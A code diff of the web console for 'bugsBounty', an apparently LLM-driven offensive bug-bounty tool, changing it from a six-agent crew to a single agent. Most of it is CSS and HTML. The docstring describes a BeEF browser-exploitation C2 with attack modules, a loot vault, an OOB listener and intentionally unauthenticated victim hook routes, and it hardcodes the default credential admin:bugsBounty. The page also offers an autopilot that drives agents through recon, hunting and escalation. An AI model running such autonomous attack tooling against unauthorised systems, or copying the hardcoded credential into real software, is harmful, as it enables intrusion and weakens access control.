@@ -1,13 +1,13 @@
-"""Live `#basement-ops` Web Command Center (`web/warroom_ui.py`).
+"""Live `#basement-ops` Web Command Center (`web/warroom_ui.py`) for the single `AGENT`.
 
 Features:
   - RFC 7617 HTTP Basic Authentication enabled by default (`admin:bugsBounty`), constant-time verified via `secrets.compare_digest`.
   - Victim hook routes (`/beef/*` and `/oob/*`) intentionally unauthenticated so hooked XSS victim browsers connect seamlessly without admin credentials, using strictly relative/same-origin paths (works locally AND over Arena HTTPS preview tunnels!).
   - 4 Full Real-Time Workspaces:
-      1. `#basement-ops` Group Chat & Crew Banter + Live Side Feed
-      2. Live Per-Agent Stats, `.bin/` Process Matrix & `PAYLOAD_MUTEX` WAF Board
+      1. `#basement-ops` Agent Console + Live Side Feed
+      2. Live Agent Stats & Stage Tracker, `.bin/` Process Matrix & `PAYLOAD_MUTEX` WAF Board
       3. Interactive BeEF Browser Exploitation C2 (10 Attack Modules, Custom JS Console, Live Hooked Victim Sandbox, Loot Vault & OOB Listener)
-      4. `RAZOR`-Verified Advisories, `curl`/Python PoCs, Binned False Positives, `CHAINSAW` Kill Chains & 22 `.bin/` Arsenal Table
+      4. Verified Advisories, `curl`/Python PoCs, Disproved Claims, Kill Chains & 22 `.bin/` Arsenal Table
 """
 import base64
 import errno
@@ -27,7 +27,7 @@ from core.llm import get_llm
 from tools.beef import DEMO_VICTIM_HTML, get_beef_server
 from tools.oob import get_oob_manager
 from tools.registry import ToolRegistry
-from agents.crew import CREW_BUS
+from agents.agent import AGENT_BUS
 from agents.warroom import WarRoomSession
 
 HTML_PAGE = r"""<!DOCTYPE html>
@@ -35,383 +35,387 @@ HTML_PAGE = r"""<!DOCTYPE html>
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>bugsBounty // #basement-ops Command Center</title>
+<title>bugsBounty — #basement-ops</title>
 <style>
   :root {
-    --bg: #06090e;
-    --panel: #0c1119;
-    --panel2: #121a26;
-    --panel3: #182233;
-    --border: #1f2d42;
-    --fg: #e6eef8;
-    --muted: #8496b0;
+    --bg: #0d0d0f;
+    --sidebar: #09090b;
+    --main: #141417;
+    --panel: #17171b;
+    --panel2: #1e1e24;
+    --border: #2a2a32;
+    --fg: #ececf1;
+    --muted: #8e8ea0;
     --cyan: #28d7ff;
-    --red: #ff4769;
     --green: #2be89a;
+    --red: #ff5d73;
     --yellow: #ffd166;
     --magenta: #c77dff;
-    --orange: #ff9248;
+    --user: #1d4ed8;
   }
   * { box-sizing: border-box; }
+  html, body { height: 100%; }
   body {
     margin: 0; background: var(--bg); color: var(--fg);
-    font-family: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-    height: 100vh; display: flex; flex-direction: column; overflow: hidden;
+    font-family: ui-sans-serif, -apple-system, "Segoe UI", Inter, Roboto, Helvetica, Arial, sans-serif;
+    font-size: 14px; overflow: hidden;
+    display: grid; grid-template-columns: 276px 1fr; height: 100vh;
   }
-  header {
-    padding: 9px 15px; background: var(--panel); border-bottom: 1px solid var(--border);
-    display: flex; align-items: center; justify-content: space-between; gap: 10px; flex-wrap: wrap;
+  body.sb-hidden { grid-template-columns: 0 1fr; }
+  body.sb-hidden .sidebar { transform: translateX(-100%); }
+  button { font-family: inherit; cursor: pointer; }
+  input, textarea, select {
+    font-family: inherit; background: #101014; color: var(--fg);
+    border: 1px solid var(--border); border-radius: 10px; padding: 9px 11px; font-size: 13px;
   }
-  .brand { display: flex; align-items: center; gap: 9px; font-weight: 800; font-size: 14px; }
-  .tag { background: #142438; color: var(--cyan); border: 1px solid #255075; padding: 2px 7px; border-radius: 4px; font-size: 10.5px; }
-  .kpis { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; font-size: 11px; color: var(--muted); }
-  .kpis span b { color: var(--fg); }
-  .job-pill {
-    display: none; align-items: center; gap: 6px; padding: 3px 9px; border-radius: 99px;
-    background: #1b2814; border: 1px solid var(--yellow); color: var(--yellow); font-size: 10.5px; font-weight: 700;
-  }
-  .job-pill.live { display: inline-flex; }
-  .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); display: inline-block; }
-  .dot.pulse { animation: pulse 1s infinite alternate; background: var(--yellow); }
-  @keyframes pulse { from { opacity: .35; transform: scale(.85); } to { opacity: 1; transform: scale(1.25); } }
+  input:focus, textarea:focus, select:focus { outline: none; border-color: #4b4b57; }
+  code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+  a { color: var(--cyan); }
 
-  .target-bar { display: flex; gap: 6px; align-items: center; flex: 1; min-width: 340px; max-width: 690px; }
-  input, select, textarea {
-    background: #06080d; border: 1px solid var(--border); color: var(--fg);
-    padding: 7px 10px; border-radius: 6px; font-family: inherit; font-size: 12px;
+  /* ---------- Sidebar ---------- */
+  .sidebar {
+    background: var(--sidebar); border-right: 1px solid var(--border);
+    display: flex; flex-direction: column; min-height: 0; overflow: hidden;
+    transition: transform .18s ease; width: 276px;
   }
-  input:focus, textarea:focus, select:focus { outline: none; border-color: var(--cyan); }
-  .target-bar input { flex: 1; }
-  button {
-    background: var(--panel2); color: var(--fg); border: 1px solid var(--border);
-    padding: 7px 11px; border-radius: 6px; font-family: inherit; font-size: 11.5px; cursor: pointer;
-    transition: all .12s ease; font-weight: 700; white-space: nowrap;
+  .sb-top { display: flex; align-items: center; justify-content: space-between; padding: 13px 12px 9px; }
+  .brand { display: flex; align-items: center; gap: 9px; font-weight: 800; letter-spacing: .2px; }
+  .brand .logo {
+    width: 26px; height: 26px; border-radius: 8px; display: grid; place-items: center;
+    background: linear-gradient(135deg, #0e7490, #155e75); color: #c8f7ff; font-size: 14px;
   }
-  button:hover:not(:disabled) { border-color: var(--cyan); color: #fff; background: var(--panel3); }
-  button:disabled { opacity: .45; cursor: not-allowed; }
-  button.primary { background: #10324a; border-color: var(--cyan); color: var(--cyan); }
-  button.danger { background: #3b1322; border-color: var(--red); color: #ff9ebb; }
-  button.success { background: #0f3628; border-color: var(--green); color: var(--green); }
-  button.warn { background: #38290d; border-color: var(--yellow); color: var(--yellow); }
+  .brand small { display: block; font-weight: 500; color: var(--muted); font-size: 10.5px; letter-spacing: .2px; }
+  .icon-btn {
+    background: transparent; color: var(--muted); border: 1px solid transparent;
+    border-radius: 8px; width: 30px; height: 30px; font-size: 15px; line-height: 1;
+    display: grid; place-items: center;
+  }
+  .icon-btn:hover { background: var(--panel2); color: var(--fg); }
+  .new-chat {
+    margin: 4px 12px 8px; padding: 10px 12px; text-align: left; font-weight: 700; font-size: 13px;
+    background: #101014; color: var(--fg); border: 1px solid var(--border); border-radius: 10px;
+  }
+  .new-chat:hover { background: var(--panel2); border-color: #3d3d47; }
+  .sb-section { padding: 8px 12px 4px; border-top: 1px solid #17171d; }
+  .sb-section.grow { flex: 1; min-height: 0; overflow-y: auto; }
+  .sb-label {
+    display: flex; justify-content: space-between; align-items: center;
+    font-size: 10.5px; text-transform: uppercase; letter-spacing: .9px; color: var(--muted); margin-bottom: 7px;
+  }
+  .target-row { display: flex; gap: 6px; }
+  .target-row input { flex: 1; min-width: 0; font-size: 12.5px; padding: 8px 9px; }
+  .mini {
+    border-radius: 8px; border: 1px solid var(--border); background: var(--panel2);
+    color: var(--fg); padding: 0 11px; font-size: 12px; font-weight: 700;
+  }
+  .mini.primary { background: #10324a; border-color: var(--cyan); color: var(--cyan); }
+  .target-hint { margin-top: 6px; font-size: 11px; color: var(--muted); word-break: break-all; }
+  .target-hint.set { color: var(--green); }
+  .action {
+    width: 100%; display: flex; align-items: center; gap: 10px; text-align: left;
+    background: transparent; border: 1px solid transparent; border-radius: 10px;
+    padding: 8px 9px; color: var(--fg); margin-bottom: 3px;
+  }
+  .action:hover { background: var(--panel2); border-color: var(--border); }
+  .action span { font-size: 16px; width: 20px; text-align: center; }
+  .action b { display: block; font-size: 12.5px; }
+  .action small { color: var(--muted); font-size: 10.5px; }
+  .action.accent { background: #0f2b3a; border-color: #1d4d63; }
+  .action.accent:hover { border-color: var(--cyan); }
+  .stage-row {
+    display: flex; align-items: center; gap: 8px; width: 100%; text-align: left;
+    background: transparent; border: none; color: var(--muted); padding: 4px 6px;
+    border-radius: 7px; font-size: 11.5px;
+  }
+  .stage-row:hover { background: var(--panel2); color: var(--fg); }
+  .stage-row .dot { width: 16px; height: 16px; border-radius: 50%; border: 1px solid var(--border); display: grid; place-items: center; font-size: 9px; }
+  .stage-row.done { color: var(--green); }
+  .stage-row.done .dot { border-color: var(--green); background: #0d2b21; }
+  .stage-row.running { color: var(--yellow); font-weight: 700; }
+  .stage-row.running .dot { border-color: var(--yellow); background: #2b2310; animation: pulse 1s infinite alternate; }
+  @keyframes pulse { from { opacity: .4; } to { opacity: 1; } }
+  .stage-row small { margin-left: auto; font-size: 10px; color: var(--muted); }
+  .mini-kpis { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; font-size: 10.5px; color: var(--muted); }
+  .mini-kpis div { background: #101014; border: 1px solid var(--border); border-radius: 8px; padding: 6px 8px; }
+  .mini-kpis b { display: block; font-size: 14px; color: var(--fg); }
+  .sb-foot { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; padding: 9px 12px 12px; border-top: 1px solid #17171d; }
+  .ghost {
+    background: transparent; border: 1px solid var(--border); color: var(--muted);
+    border-radius: 8px; padding: 6px 8px; font-size: 11px; font-weight: 600;
+  }
+  .ghost:hover { color: var(--fg); border-color: #3d3d47; }
 
-  nav.nav-views {
-    display: flex; align-items: center; justify-content: space-between; gap: 6px;
-    background: #090d14; border-bottom: 1px solid var(--border); padding: 0 14px;
+  /* ---------- Main ---------- */
+  .main { display: flex; flex-direction: column; min-width: 0; min-height: 0; background: var(--main); }
+  .topbar {
+    display: flex; align-items: center; gap: 10px; padding: 9px 14px;
+    border-bottom: 1px solid var(--border); background: rgba(20,20,23,.92); backdrop-filter: blur(6px);
   }
-  .view-tabs { display: flex; gap: 4px; overflow-x: auto; }
-  .view-tabs button {
-    border: none; border-bottom: 2px solid transparent; border-radius: 0; background: transparent;
-    padding: 9px 13px; font-size: 11.5px; color: var(--muted);
+  .menu-btn { display: none; }
+  .topbar-title { font-weight: 700; font-size: 13px; display: flex; align-items: center; gap: 8px; white-space: nowrap; }
+  .pill {
+    font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: .6px;
+    padding: 2px 8px; border-radius: 99px; background: #1c1c22; color: var(--muted); border: 1px solid var(--border);
   }
-  .view-tabs button.active { color: var(--cyan); border-bottom-color: var(--cyan); background: #0e1724; }
-  .badge-cnt { background: #1a2639; color: var(--fg); padding: 1px 6px; border-radius: 99px; font-size: 10px; margin-left: 5px; }
-  .badge-cnt.green { background: #104531; color: var(--green); }
-  .badge-cnt.red { background: #4d1626; color: #ff99ac; }
+  .pill.RUNNING { color: var(--yellow); border-color: #57470f; background: #2a2310; }
+  .pill.DONE { color: var(--green); border-color: #14503a; background: #0d2b21; }
+  .pill.ERROR { color: var(--red); border-color: #5b1b26; background: #2a1015; }
+  .topbar-right { margin-left: auto; display: flex; gap: 6px; align-items: center; overflow-x: auto; }
+  .chip {
+    font-size: 10.5px; color: var(--muted); background: #101014; border: 1px solid var(--border);
+    border-radius: 99px; padding: 3px 9px; white-space: nowrap;
+  }
+  .chip b { color: var(--fg); }
+  .chip.green b { color: var(--green); }
+  .chip.red b { color: var(--red); }
 
-  .workspace { display: none; flex: 1; min-height: 0; }
-  .workspace.active { display: grid; }
-  #view-chat.active { grid-template-columns: 285px 1fr 390px; }
-  #view-ops.active { grid-template-rows: auto 1fr; grid-template-columns: 1fr; overflow-y: auto; display: flex; flex-direction: column; }
-  #view-beef.active { grid-template-columns: 320px 1fr 410px; }
-  #view-findings.active { grid-template-columns: 350px 1fr; }
+  .scroll { flex: 1; overflow-y: auto; scroll-behavior: smooth; }
+  .thread { max-width: 820px; margin: 0 auto; padding: 26px 20px 12px; display: flex; flex-direction: column; gap: 12px; }
 
-  .col { display: flex; flex-direction: column; min-height: 0; border-right: 1px solid var(--border); }
-  .col:last-child { border-right: none; }
-  .pane-head {
-    padding: 8px 12px; font-size: 10.5px; text-transform: uppercase; letter-spacing: .9px;
-    color: var(--muted); border-bottom: 1px solid var(--border); background: var(--panel);
+  /* ---------- Welcome ---------- */
+  .hero { text-align: center; padding: 42px 8px 20px; }
+  .hero h1 { font-size: 26px; margin: 0 0 8px; letter-spacing: -.4px; }
+  .hero p { color: var(--muted); max-width: 560px; margin: 0 auto 22px; line-height: 1.55; font-size: 13px; }
+  .hero-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 9px; max-width: 620px; margin: 0 auto; }
+  .hero-card {
+    text-align: left; background: #17171b; border: 1px solid var(--border); border-radius: 12px;
+    padding: 12px 13px; color: var(--fg);
+  }
+  .hero-card:hover { border-color: #45454f; background: #1c1c22; }
+  .hero-card b { display: block; font-size: 12.5px; margin-bottom: 3px; }
+  .hero-card code { color: var(--cyan); font-size: 11px; }
+  .hero-card small { display: block; color: var(--muted); font-size: 10.8px; margin-top: 4px; line-height: 1.4; }
+
+  /* ---------- Messages ---------- */
+  .msg-row { display: flex; gap: 10px; align-items: flex-start; }
+  .msg-row.user { flex-direction: row-reverse; }
+  .avatar {
+    width: 27px; height: 27px; border-radius: 8px; flex: none; display: grid; place-items: center;
+    font-size: 9.5px; font-weight: 800; margin-top: 2px;
+  }
+  .avatar.agent { background: #0e2b36; color: var(--cyan); border: 1px solid #17475c; }
+  .avatar.user { background: #16224a; color: #b9c8ff; border: 1px solid #26356b; }
+  .bubble-col { min-width: 0; max-width: 88%; }
+  .who { display: flex; gap: 7px; align-items: center; font-size: 10.5px; color: var(--muted); margin-bottom: 3px; }
+  .bubble {
+    background: #1b1b20; border: 1px solid #26262e; border-radius: 13px;
+    padding: 10px 13px; line-height: 1.6; font-size: 13.4px; word-break: break-word; white-space: normal;
+  }
+  .msg-row.user .bubble { background: var(--user); border-color: #2f5bd6; color: #fff; }
+  .bubble.verified { border-color: #14503a; background: #0e241c; }
+  .bubble.disproved { border-color: #5b1b26; background: #241015; }
+  .bubble.warn { border-color: #57470f; background: #241f0e; }
+  .bubble.error { border-color: #5b1b26; background: #241015; }
+  .bubble.waf { border-color: #4a2c63; background: #1d1428; }
+  .bubble code { background: #101014; border: 1px solid #2b2b34; border-radius: 5px; padding: 1px 5px; font-size: 11.8px; color: #9be7ff; }
+  .msg-row.user .bubble code { background: rgba(0,0,0,.25); border-color: rgba(255,255,255,.18); color: #fff; }
+  .bubble pre.code {
+    background: #0b0b0e; border: 1px solid #26262e; border-radius: 8px; padding: 9px 11px;
+    overflow-x: auto; font-size: 11.5px; color: #9be7ff; margin: 7px 0 2px; white-space: pre-wrap; word-break: break-all;
+  }
+  .kindtag {
+    font-size: 9px; font-weight: 800; letter-spacing: .5px; text-transform: uppercase;
+    padding: 1px 6px; border-radius: 5px; background: #26262e; color: var(--muted);
+  }
+  .kindtag.verified { background: #0d2b21; color: var(--green); }
+  .kindtag.disproved, .kindtag.error { background: #2a1015; color: var(--red); }
+  .kindtag.warn { background: #2a2310; color: var(--yellow); }
+  .kindtag.waf { background: #1d1428; color: var(--magenta); }
+
+  .activity {
+    display: flex; gap: 8px; align-items: baseline; font-size: 11.5px; color: var(--muted);
+    padding: 4px 10px 4px 42px; border-left: 2px solid #23232b; margin-left: 8px;
+  }
+  .activity .atag { font-size: 9px; text-transform: uppercase; letter-spacing: .6px; color: var(--cyan); font-weight: 800; }
+  .activity.done { color: #9ea0b3; }
+
+  .typing { display: flex; gap: 9px; align-items: center; padding: 4px 0 10px 37px; color: var(--muted); font-size: 11.5px; }
+  .dots { display: inline-flex; gap: 3px; }
+  .dots i { width: 5px; height: 5px; border-radius: 50%; background: var(--cyan); display: block; animation: bounce 1s infinite; }
+  .dots i:nth-child(2) { animation-delay: .15s; }
+  .dots i:nth-child(3) { animation-delay: .3s; }
+  @keyframes bounce { 0%, 70%, 100% { transform: translateY(0); opacity: .45; } 35% { transform: translateY(-4px); opacity: 1; } }
+
+  /* ---------- Composer ---------- */
+  .composer { padding: 8px 18px 14px; background: var(--main); }
+  .chips { display: flex; gap: 6px; overflow-x: auto; padding: 0 0 8px; max-width: 820px; margin: 0 auto; }
+  .chips button {
+    background: #17171b; border: 1px solid var(--border); color: var(--muted);
+    border-radius: 99px; padding: 4px 11px; font-size: 11.5px; white-space: nowrap;
+  }
+  .chips button:hover { color: var(--cyan); border-color: #24596d; }
+  .input-wrap {
+    max-width: 820px; margin: 0 auto; display: flex; align-items: flex-end; gap: 8px;
+    background: #1a1a1f; border: 1px solid var(--border); border-radius: 16px; padding: 8px 8px 8px 14px;
+    transition: border-color .15s;
+  }
+  .input-wrap:focus-within { border-color: #4a5b6b; }
+  #chatInput {
+    flex: 1; border: none; background: transparent; resize: none; max-height: 190px;
+    padding: 4px 0; font-size: 13.5px; line-height: 1.5;
+  }
+  #chatInput:focus { outline: none; }
+  .send {
+    width: 32px; height: 32px; border-radius: 10px; border: none; flex: none;
+    background: var(--cyan); color: #06202b; font-size: 15px; font-weight: 800; display: grid; place-items: center;
+  }
+  .send:disabled { opacity: .35; }
+  .composer-foot { max-width: 820px; margin: 7px auto 0; text-align: center; font-size: 10.5px; color: var(--muted); }
+
+  /* ---------- Drawer panel ---------- */
+  .backdrop { position: fixed; inset: 0; background: rgba(0,0,0,.45); opacity: 0; pointer-events: none; transition: opacity .16s; z-index: 40; }
+  .backdrop.show { opacity: 1; pointer-events: auto; }
+  .panel {
+    position: fixed; top: 0; right: 0; height: 100vh; width: min(520px, 100vw); z-index: 41;
+    background: var(--panel); border-left: 1px solid var(--border);
+    display: flex; flex-direction: column; transform: translateX(102%); transition: transform .18s ease;
+  }
+  .panel.show { transform: translateX(0); }
+  .panel-head {
     display: flex; justify-content: space-between; align-items: center; gap: 8px;
+    padding: 11px 14px; border-bottom: 1px solid var(--border); font-weight: 700; font-size: 13px;
   }
-  .scroll { flex: 1; overflow-y: auto; padding: 11px; }
+  .panel-body { flex: 1; overflow-y: auto; padding: 12px 14px 26px; }
+  .panel h4 { font-size: 10.5px; text-transform: uppercase; letter-spacing: .8px; color: var(--muted); margin: 16px 0 7px; }
+  .card { background: #101014; border: 1px solid var(--border); border-radius: 10px; padding: 10px 12px; margin-bottom: 8px; font-size: 12px; }
+  .card.critical { border-left: 3px solid var(--red); }
+  .card.high { border-left: 3px solid var(--yellow); }
+  .card.ok { border-left: 3px solid var(--green); }
+  .card.bad { border-left: 3px solid var(--red); }
+  .card .row { display: flex; justify-content: space-between; gap: 8px; flex-wrap: wrap; }
+  .evrow { display: flex; gap: 8px; padding: 4px 0; border-bottom: 1px solid #1a1a20; font-size: 11px; }
+  .evrow .cat { color: var(--cyan); min-width: 62px; font-size: 9.5px; text-transform: uppercase; font-weight: 700; padding-top: 1px; }
+  .evrow .txt { min-width: 0; flex: 1; word-break: break-word; }
+  .evrow .txt small { color: var(--muted); display: block; }
+  .panel-actions { display: flex; gap: 6px; flex-wrap: wrap; margin-bottom: 8px; }
+  .panel-actions button, .panel .btn {
+    background: var(--panel2); border: 1px solid var(--border); color: var(--fg);
+    border-radius: 8px; padding: 6px 10px; font-size: 11.5px; font-weight: 700;
+  }
+  .panel .btn.primary { background: #10324a; border-color: var(--cyan); color: var(--cyan); }
+  .panel .btn.danger { background: #3b1322; border-color: var(--red); color: #ff9ebb; }
+  .panel .btn.success { background: #0f3628; border-color: var(--green); color: var(--green); }
+  .panel input, .panel textarea, .panel select { width: 100%; margin-bottom: 7px; font-size: 12px; }
+  .panel pre.code { background: #08080b; border: 1px solid #26262e; border-radius: 8px; padding: 8px 10px; font-size: 10.8px; color: #9be7ff; overflow-x: auto; white-space: pre-wrap; word-break: break-all; }
+  #victimHolder { display: none; border-top: 1px solid var(--border); padding: 10px 14px 12px; background: #121216; }
+  #victimHolder.show { display: block; }
+  .victim-head { display: flex; justify-content: space-between; align-items: center; font-size: 10.5px; text-transform: uppercase; letter-spacing: .8px; color: var(--muted); margin-bottom: 7px; }
+  #victimFrame { width: 100%; height: 300px; border: 1px solid var(--border); border-radius: 10px; background: #0b1220; }
+  .empty { color: var(--muted); font-size: 11.5px; padding: 6px 0; }
 
-  /* Crew Cards with Live Stats */
-  .crew-card {
-    padding: 9px 10px; border: 1px solid var(--border); border-radius: 7px; margin-bottom: 8px;
-    background: var(--panel); cursor: pointer; transition: all .14s;
+  /* ---------- Responsive ---------- */
+  @media (max-width: 900px) {
+    body { grid-template-columns: 0 1fr; }
+    .sidebar { position: fixed; z-index: 50; height: 100vh; transform: translateX(-100%); box-shadow: 0 0 40px rgba(0,0,0,.6); }
+    body.sb-open .sidebar { transform: translateX(0); }
+    body.sb-open .backdrop { opacity: 1; pointer-events: auto; }
+    .menu-btn { display: grid; }
+    .topbar-right .chip:nth-child(n+5) { display: none; }
+    .bubble-col { max-width: 92%; }
+    .thread { padding: 18px 12px 8px; }
+    .hero-grid { grid-template-columns: 1fr; }
   }
-  .crew-card:hover { border-color: #365073; }
-  .crew-card.active { border-color: var(--cyan); background: #101e2e; }
-  .crew-card.running { border-color: var(--yellow); box-shadow: 0 0 14px rgba(255,209,102,.15); }
-  .state-chip { font-size: 9.5px; padding: 1px 6px; border-radius: 4px; font-weight: 800; background: #1a2436; color: var(--muted); }
-  .state-chip.RUNNING { background: #47350e; color: var(--yellow); }
-  .state-chip.DONE { background: #103c2b; color: var(--green); }
-  .state-chip.ERROR { background: #4a1525; color: #ff8fa3; }
-  .mini-stats {
-    display: grid; grid-template-columns: repeat(4, 1fr); gap: 4px; margin-top: 7px;
-    padding-top: 6px; border-top: 1px dashed #1c293d; font-size: 9.8px; color: var(--muted);
-  }
-  .mini-stats b { display: block; color: var(--fg); font-size: 11px; }
-  .task-line { font-size: 10px; color: #9ec5ea; margin-top: 5px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-
-  .actions-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; padding: 9px 10px; border-top: 1px solid var(--border); background: var(--panel); }
-
-  /* Chat Messages */
-  .msg {
-    padding: 9px 11px; border-radius: 7px; background: var(--panel); border-left: 3px solid #2b3d57;
-    margin-bottom: 8px; font-size: 12px; line-height: 1.48; word-break: break-word;
-  }
-  .msg.cheer { border-left-color: var(--green); background: #0a2019; }
-  .msg.browneye { border-left-color: var(--red); background: #240f17; }
-  .msg.handoff { border-left-color: var(--magenta); background: #181126; }
-  .msg.audit { border-left-color: var(--yellow); background: #211b0c; }
-  .msg.waf { border-left-color: var(--orange); background: #24160c; }
-  .msg.operator { border-left-color: var(--cyan); background: #0e1d2c; }
-  .msg-head { display: flex; gap: 7px; align-items: center; margin-bottom: 4px; font-size: 10.5px; flex-wrap: wrap; }
-  .badge { padding: 1px 6px; border-radius: 4px; font-size: 9px; font-weight: 800; text-transform: uppercase; background: #1c283b; color: var(--muted); }
-  .quick-bar {
-    display: flex; gap: 5px; padding: 6px 10px; background: #090d14; border-top: 1px solid var(--border); overflow-x: auto;
-  }
-  .quick-bar button { padding: 4px 8px; font-size: 10.5px; font-weight: 600; }
-  .composer {
-    padding: 9px 10px; background: var(--panel); border-top: 1px solid var(--border);
-    display: flex; gap: 7px; align-items: center;
-  }
-  .composer input { flex: 1; padding: 8px 11px; font-size: 12.5px; }
-
-  /* Wire Events & Ops Matrix */
-  .ev-row {
-    font-size: 11px; padding: 5px 8px; border-bottom: 1px solid #131c29; display: flex; gap: 8px; align-items: baseline;
-  }
-  .ev-row.warn { background: rgba(255,209,102,.05); }
-  .ev-row.error { background: rgba(255,71,105,.08); }
-  .ev-row.success { background: rgba(43,232,154,.06); }
-  .ev-cat { font-size: 9px; padding: 1px 5px; border-radius: 3px; background: #192538; color: var(--cyan); min-width: 54px; text-align: center; text-transform: uppercase; font-weight: 700; }
-  .ops-cards { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 12px; }
-  .ops-card { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; padding: 11px 13px; }
-  .ops-mid { display: grid; grid-template-columns: 1.2fr 1fr; gap: 10px; padding: 0 12px 12px; }
-  .ops-box { background: var(--panel); border: 1px solid var(--border); border-radius: 8px; display: flex; flex-direction: column; max-height: 250px; }
-
-  /* Findings & BeEF Cards */
-  .tabs { display: flex; border-bottom: 1px solid var(--border); background: var(--panel); }
-  .tabs button { flex: 1; border: none; border-radius: 0; border-bottom: 2px solid transparent; padding: 8px 4px; font-size: 10.5px; background: transparent; color: var(--muted); }
-  .tabs button.active { border-bottom-color: var(--cyan); color: var(--cyan); }
-  .finding { border: 1px solid var(--border); background: var(--panel); border-radius: 7px; padding: 9px 11px; margin-bottom: 8px; font-size: 11.5px; }
-  .finding.critical { border-left: 3px solid var(--red); }
-  .finding.high { border-left: 3px solid var(--yellow); }
-  .finding.disproved { border-left: 3px solid #5c677d; opacity: .88; }
-  pre.code {
-    background: #05070b; border: 1px solid #1b2638; padding: 7px 9px; border-radius: 5px;
-    overflow-x: auto; font-size: 10.5px; color: #9be7ff; margin: 6px 0 0; white-space: pre-wrap; word-break: break-all;
-  }
-  .mod-btn {
-    width: 100%; text-align: left; margin-bottom: 6px; padding: 8px 10px; display: flex; flex-direction: column; gap: 2px;
-  }
-  .mod-btn small { color: var(--muted); font-weight: 400; font-size: 10px; white-space: normal; }
 </style>
 </head>
 <body>
-<header>
-  <div class="brand">
-    <span>bugsBounty</span>
-    <span class="tag">#basement-ops</span>
-    <span class="job-pill" id="jobPill"><span class="dot pulse"></span><span id="jobText">Running...</span></span>
-  </div>
-  <div class="kpis" id="kpiBar">
-    <span>HTTP: <b id="kHttp">0</b></span>
-    <span>.bin: <b id="kBin">0</b></span>
-    <span>WAF Wins: <b id="kWaf" style="color:var(--green)">0</b></span>
-    <span>BeEF Online: <b id="kBeef" style="color:var(--cyan)">0</b></span>
-    <span>OOB Hits: <b id="kOob" style="color:var(--magenta)">0</b></span>
-    <span>Verified: <b id="kVer" style="color:var(--green)">0</b></span>
-    <span>Brown-Eyes: <b id="kBinFp" style="color:var(--red)">0</b></span>
-  </div>
-  <div class="target-bar">
-    <input id="targetInput" placeholder="https://authorized-target.tld  (or Launch Lab ->)" />
-    <button onclick="setTarget()">Target</button>
-    <button class="success" onclick="sendCmd('/lab', '', true)">Launch Lab</button>
-    <button class="danger" onclick="sendCmd('/autopilot', '', true)">⚡ 6-Agent Autopilot</button>
-    <button class="primary" onclick="toggleKeyBar()">🔑 API Key</button>
-  </div>
-</header>
-
-<div id="keyBar" style="display:none;padding:9px 15px;background:#0a101a;border-bottom:1px solid var(--border);gap:8px;align-items:center;flex-wrap:wrap">
-  <span style="font-size:11.5px;color:var(--cyan);font-weight:700">LLM Config:</span>
-  <select id="provSelect">
-    <option value="groq">Groq Cloud (https://api.groq.com/openai/v1 — qwen/qwen3.8-27b)</option>
-    <option value="ollama">Local Ollama (http://localhost:11434)</option>
-    <option value="openai">OpenAI (https://api.openai.com/v1)</option>
-    <option value="xai">xAI (https://api.x.ai/v1 — xai-...)</option>
-  </select>
-  <input id="apiKeyInput" type="password" placeholder="Paste Groq API key (gsk_...)" style="flex:1;min-width:230px" />
-  <input id="modelInput" placeholder="Model (default: qwen/qwen3.8-27b)" style="width:240px" />
-  <button class="success" onclick="saveLlmKey()">Save &amp; Activate</button>
-  <span id="keyStatus" style="font-size:11px;color:var(--muted)"></span>
-</div>
-
-<nav class="nav-views">
-  <div class="view-tabs">
-    <button id="tab-chat" class="active" onclick="switchView('chat')">💬 #basement-ops Group Chat &amp; War-Room</button>
-    <button id="tab-ops" onclick="switchView('ops')">📡 Live Agent Stats &amp; .bin Activity <span class="badge-cnt" id="navActiveCnt">0 active</span></button>
-    <button id="tab-beef" onclick="switchView('beef')">🐂 BeEF Hook C2 &amp; OOB Panel <span class="badge-cnt green" id="navBeefCnt">0 hooked</span></button>
-    <button id="tab-findings" onclick="switchView('findings')">🏆 Advisories, PoCs, Chains &amp; 22 Tools <span class="badge-cnt green" id="navVerCnt">0</span></button>
-  </div>
-  <div style="font-size:10.5px;color:var(--muted)">LLM: <b id="llmBadge" style="color:var(--cyan)">...</b></div>
-</nav>
-
-<!-- ==================== WORKSPACE 1: GROUP CHAT & WAR-ROOM ==================== -->
-<div class="workspace active" id="view-chat">
-  <div class="col">
-    <div class="pane-head"><span>6-Agent Crew &amp; Live Telemetry</span><span>Click to @Tag</span></div>
-    <div class="scroll" id="crewList"></div>
-    <div class="actions-grid">
-      <button onclick="sendCmd('/recon', '', true)">1. GHOST Recon</button>
-      <button onclick="sendCmd('/hunt', '', true)">2. BLITZ Hunt</button>
-      <button onclick="sendCmd('/escalate', '', true)">3. SWITCH Escalate</button>
-      <button onclick="sendCmd('/critic', '', true)">4. RAZOR Critic</button>
-      <button onclick="sendCmd('/chains', '', true)">5. CHAINSAW</button>
-      <button onclick="sendCmd('/report', '', true)">6. FIXER Report</button>
+<aside class="sidebar" id="sidebar">
+  <div class="sb-top">
+    <div class="brand">
+      <span class="logo">◈</span>
+      <div>bugsBounty<small>single agent console</small></div>
     </div>
   </div>
+  <button class="new-chat" onclick="newChat()">＋ New chat</button>
 
-  <div class="col">
-    <div class="pane-head">
-      <span>#basement-ops Group Chat — Banter, Handoffs, Cheers &amp; RAZOR Brown-Eyes</span>
-      <span id="chatTyping" style="color:var(--yellow)"></span>
+  <div class="sb-section">
+    <label class="sb-label">Target</label>
+    <div class="target-row">
+      <input id="targetInput" placeholder="site.com or https://..." autocomplete="off" />
+      <button class="mini primary" onclick="setTarget()">Set</button>
     </div>
-    <div class="scroll" id="chatFeed"></div>
-    <div class="quick-bar">
